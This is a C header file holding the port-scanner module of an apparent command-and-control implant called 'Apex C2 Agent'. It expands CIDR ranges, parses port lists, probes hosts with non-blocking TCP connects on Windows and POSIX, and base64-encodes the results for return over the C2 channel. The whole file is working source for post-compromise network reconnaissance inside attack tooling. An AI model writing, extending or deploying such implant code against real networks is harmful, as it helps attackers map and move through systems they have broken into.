#ifndef APEX_PORTSCAN_H
#define APEX_PORTSCAN_H

/*
 * Built-in TCP port scanner for Apex C2 Agent.
 * Supports single IP or CIDR notation, comma-separated ports and ranges.
 *
 * Usage from C2: portscan 192.168.1.0/24 22,80,443,8080-8090
 *                portscan 10.0.0.5 1-1024
 */

#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <poll.h>
#include <errno.h>
#include <unistd.h>
#endif

#define SCAN_TIMEOUT_MS 1500
#define MAX_SCAN_PORTS  256
#define MAX_SCAN_HOSTS  256

/* Parse CIDR "x.x.x.x/mask" → populate host array, return count */
static int cidr_expand(const char *cidr, uint32_t *hosts, int max_hosts) {
    char ip_str[64];
    int mask = 32;

    const char *slash = strchr(cidr, '/');
    if (slash) {
        size_t len = (size_t)(slash - cidr);
        if (len >= sizeof(ip_str)) len = sizeof(ip_str) - 1;
        memcpy(ip_str, cidr, len);
        ip_str[len] = '\0';
        mask = atoi(slash + 1);
        if (mask < 0 || mask > 32) mask = 32;
    } else {
        strncpy(ip_str, cidr, sizeof(ip_str) - 1);
        ip_str[sizeof(ip_str) - 1] = '\0';
    }

    uint32_t ip = ntohl(inet_addr(ip_str));
    if (ip == INADDR_NONE && strcmp(ip_str, "255.255.255.255") != 0) return 0;

    if (mask == 32) {
        hosts[0] = ip;
        return 1;
    }

    uint32_t net_mask = mask == 0 ? 0 : (~0U << (32 - mask));
    uint32_t network = ip & net_mask;
    uint32_t broadcast = network | ~net_mask;
    int count = 0;

    /* Skip network and broadcast addresses */
    for (uint32_t h = network + 1; h < broadcast && count < max_hosts; h++) {
        hosts[count++] = h;
    }
    return count;
}

/* Parse "22,80,443,8080-8090" → populate ports array, return count */
static int parse_ports(const char *spec, uint16_t *ports, int max_ports) {
    int count = 0;
    const char *p = spec;

    while (*p && count < max_ports) {
        while (*p == ' ' || *p == ',') p++;
        if (!*p) break;

        int start = atoi(p);
        while (*p && *p != ',' && *p != '-') p++;

        if (*p == '-') {
            p++;
            int end = atoi(p);
            while (*p && *p != ',') p++;
            if (start < 1) start = 1;
            if (end > 65535) end = 65535;
            for (int port = start; port <= end && count < max_ports; port++)
                ports[count++] = (uint16_t)port;
        } else {
            if (start >= 1 && start <= 65535)
                ports[count++] = (uint16_t)start;
        }
    }
    return count;
}

static int tcp_connect_check(uint32_t ip_host_order, uint16_t port) {
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr.s_addr = htonl(ip_host_order);

#ifdef _WIN32
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return 0;

    u_long mode = 1;
    ioctlsocket(s, FIONBIO, &mode);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    fd_set wset;
    FD_ZERO(&wset);
    FD_SET(s, &wset);
    struct timeval tv = { SCAN_TIMEOUT_MS / 1000, (SCAN_TIMEOUT_MS % 1000) * 1000 };
    int ready = select(0, NULL, &wset, NULL, &tv);
    int open = 0;
    if (ready > 0 && FD_ISSET(s, &wset)) {
        int err = 0;
        int errlen = sizeof(err);
        getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&err, &errlen);
        if (err == 0) open = 1;
    }
    closesocket(s);
    return open;
#else
    int s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 0;

    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));

    struct pollfd pfd = { .fd = s, .events = POLLOUT };
    int ready = poll(&pfd, 1, SCAN_TIMEOUT_MS);
    int open = 0;
    if (ready > 0 && (pfd.revents & POLLOUT)) {
        int err = 0;
        socklen_t errlen = sizeof(err);
        getsockopt(s, SOL_SOCKET, SO_ERROR, &err, &errlen);
        if (err == 0) open = 1;
    }
    close(s);
    return open;
#endif
}

static void handle_portscan(const char *args, char *out_b64, size_t out_b64_cap) {
    if (!args || !args[0]) {
        const char *msg = "Usage: portscan <ip|cidr> <ports>\nExample: portscan 192.168.1.0/24 22,80,443";
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    char target[256] = "", port_spec[1024] = "";
    const char *sp = strchr(args, ' ');
    if (!sp) {
        const char *msg = "Usage: portscan <ip|cidr> <ports>";
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

    size_t tlen = (size_t)(sp - args);
    if (tlen >= sizeof(target)) tlen = sizeof(target) - 1;
    memcpy(target, args, tlen);
    target[tlen] = '\0';
    strncpy(port_spec, sp + 1, sizeof(port_spec) - 1);

    uint32_t hosts[MAX_SCAN_HOSTS];
    uint16_t ports[MAX_SCAN_PORTS];
    int host_count = cidr_expand(target, hosts, MAX_SCAN_HOSTS);
    int port_count = parse_ports(port_spec, ports, MAX_SCAN_PORTS);

    if (host_count == 0 || port_count == 0) {
        const char *msg = "Invalid target or port specification";
        b64_encode((unsigned char*)msg, strlen(msg), out_b64);
        return;
    }

#ifdef _WIN32
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
#endif

    char *result_buf = (char *)malloc(BUF_SIZE);
    if (!result_buf) {
        b64_encode((unsigned char*)"Out of memory", 13, out_b64);
        return;
    }

    size_t off = 0;
    off += (size_t)snprintf(result_buf + off, BUF_SIZE - off,
        "Scanning %d host(s), %d port(s)...\n\n%-18s %-8s %s\n",
        host_count, port_count, "HOST", "PORT", "STATE");
    off += (size_t)snprintf(result_buf + off, BUF_SIZE - off,
        "%-18s %-8s %s\n", "----", "----", "-----");

    int open_count = 0;
    for (int h = 0; h < host_count && off < BUF_SIZE - 100; h++) {
        struct in_addr a;
        a.s_addr = htonl(hosts[h]);
        char *ip_str = inet_ntoa(a);

        for (int p = 0; p < port_count && off < BUF_SIZE - 100; p++) {
            if (tcp_connect_check(hosts[h], ports[p])) {
                off += (size_t)snprintf(result_buf + off, BUF_SIZE - off,
                    "%-18s %-8d open\n", ip_str, ports[p]);
                open_count++;
            }
        }
    }

    off += (size_t)snprintf(result_buf + off, BUF_SIZE - off,
        "\n%d open port(s) found.", open_count);

#ifdef _WIN32
    WSACleanup();
#endif

    size_t b64_needed = (off + 2) / 3 * 4 + 1;
    if (b64_needed < out_b64_cap)
        b64_encode((unsigned char*)result_buf, off, out_b64);
    else
        b64_encode((unsigned char*)"Output too large", 16, out_b64);

    free(result_buf);
}

#endif /* APEX_PORTSCAN_H */
